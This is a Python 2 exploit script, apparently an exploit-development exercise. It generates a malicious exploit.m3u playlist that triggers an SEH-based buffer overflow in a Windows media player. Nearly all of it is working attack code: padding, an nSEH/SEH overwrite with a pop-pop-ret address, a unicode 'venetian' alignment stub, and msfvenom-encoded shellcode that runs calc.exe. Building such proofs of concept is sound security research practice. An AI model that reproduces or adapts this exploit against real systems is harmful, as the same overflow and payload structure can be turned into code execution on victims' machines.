#!/usr/bin/python
import sys
from subprocess import call
from struct import pack
import codecs

def c(x):
  return pack('<L', x)

def pc(length):
    pattern = ''
    parts = ['A', 'a', '0']
    while len(pattern) != length:
        pattern += parts[len(pattern) % 3]
        if len(pattern) % 3 == 0:
            parts[2] = chr(ord(parts[2]) + 1)
            if parts[2] > '9':
                parts[2] = '0'
                parts[1] = chr(ord(parts[1]) + 1)
                if parts[1] > 'z':
                    parts[1] = 'a'
                    parts[0] = chr(ord(parts[0]) + 1)
                    if parts[0] > 'Z':
                        parts[0] = 'A'
    return pattern

def junk(size):
	return "\x90"*size

buffer = "c:\\"
exploit = ""
buffsize = 5000

#msfvenom -p windows/exec cmd=calc.exe -e x86/unicode_mixed    bufferregister=eax EXITFUNC=none -f c
shellcode = ("\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
"\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
"\x49\x41\x6a\x58\x41\x51\x41\x44\x41\x5a\x41\x42\x41\x52\x41"
"\x4c\x41\x59\x41\x49\x41\x51\x41\x49\x41\x51\x41\x49\x41\x68"
"\x41\x41\x41\x5a\x31\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49"
"\x41\x49\x41\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49"
"\x41\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41\x5a"
"\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41\x47\x42\x39"
"\x75\x34\x4a\x42\x69\x6c\x6a\x48\x42\x62\x4b\x50\x6b\x50\x59"
"\x70\x71\x50\x45\x39\x59\x55\x70\x31\x59\x30\x63\x34\x52\x6b"
"\x4e\x70\x70\x30\x74\x4b\x32\x32\x7a\x6c\x64\x4b\x71\x42\x5a"
"\x74\x32\x6b\x44\x32\x4e\x48\x6a\x6f\x34\x77\x4d\x7a\x6f\x36"
"\x30\x31\x4b\x4f\x74\x6c\x4f\x4c\x61\x51\x73\x4c\x7a\x62\x6e"
"\x4c\x6f\x30\x55\x71\x48\x4f\x6a\x6d\x69\x71\x67\x57\x57\x72"
"\x7a\x52\x52\x32\x31\x47\x74\x4b\x61\x42\x6a\x70\x74\x4b\x70"
"\x4a\x6f\x4c\x74\x4b\x30\x4c\x6e\x31\x73\x48\x6b\x33\x31\x38"
"\x4b\x51\x78\x51\x6e\x71\x64\x4b\x32\x39\x4b\x70\x4d\x31\x79"
"\x43\x72\x6b\x6e\x69\x4b\x68\x37\x73\x4d\x6a\x50\x49\x42\x6b"
"\x4d\x64\x32\x6b\x69\x71\x69\x46\x6d\x61\x39\x6f\x56\x4c\x57"
"\x51\x36\x6f\x6a\x6d\x5a\x61\x65\x77\x4d\x68\x77\x70\x70\x75"
"\x39\x66\x39\x73\x33\x4d\x4a\x58\x6d\x6b\x31\x6d\x6c\x64\x53"
"\x45\x58\x64\x70\x58\x42\x6b\x51\x48\x4c\x64\x59\x71\x7a\x33"
"\x50\x66\x44\x4b\x7a\x6c\x70\x4b\x64\x4b\x42\x38\x6b\x6c\x6b"
"\x51\x67\x63\x64\x4b\x7a\x64\x64\x4b\x7a\x61\x68\x50\x31\x79"
"\x4d\x74\x4e\x44\x6b\x74\x31\x4b\x4f\x6b\x51\x51\x70\x59\x6f"
"\x6a\x30\x51\x49\x6f\x77\x70\x4f\x6f\x31\x4f\x71\x4a\x74\x4b"
"\x6e\x32\x68\x6b\x52\x6d\x4f\x6d\x31\x5a\x49\x71\x44\x4d\x75"
"\x35\x44\x72\x39\x70\x6b\x50\x39\x70\x70\x50\x31\x58\x4d\x61"
"\x74\x4b\x42\x4f\x33\x57\x4b\x4f\x7a\x35\x37\x4b\x75\x5a\x37"
"\x55\x39\x52\x71\x4d\x33\x38\x77\x36\x73\x65\x57\x4d\x63\x6d"
"\x4b\x4f\x37\x65\x6f\x4c\x49\x76\x61\x6c\x5a\x6a\x53\x50\x39"
"\x6b\x79\x50\x53\x45\x79\x75\x55\x6b\x6d\x77\x6a\x73\x30\x72"
"\x32\x4f\x31\x5a\x6d\x30\x62\x33\x49\x6f\x58\x55\x72\x43\x4f"
"\x71\x30\x6c\x42\x43\x6c\x6e\x30\x65\x50\x78\x52\x45\x4d\x30"
"\x41\x41")


exploit += junk(533)
nseh = "\x41\x71" #nseh walkover
seh = "\xf2\x41" # pop pop ret
# venetian = '\xbb\x56\x41m\xb8\x55\x41\xe3m\xb9\x4b\x41m\xb8\x6d\x41\xe1m\xba\x79\x41m\xb8\x63\x41\xe2mUmX\xf4\xf4\xf4\xd4\xd4m'
venetian = 'm\xbb\x56\x41m\xb8\x55\x41\xe3m\xb9\x4b\x41m\xb8\x6d\x41\xe1m\xba\x79\x41m\xb8\x63\x41\xe2mUmX\xdc\xec\xd4\xf8\xd8\xe8\xc8\xf0m' 
#looks like nullbyte is added to venetian so prepending with nullbyte
exploit += nseh + seh + venetian + shellcode
exploit += junk(buffsize-len(exploit))
# print exploit

print "Exploit size %s" % len(exploit)
exploit += ".mp3"
print "[+] Creating malicious file"
print "[+] exploit.m3u"

buffer +=exploit
file = open("/Users/omaidfaizyar/Desktop/VM/exploit.m3u","w")
file.write(buffer)
file.close()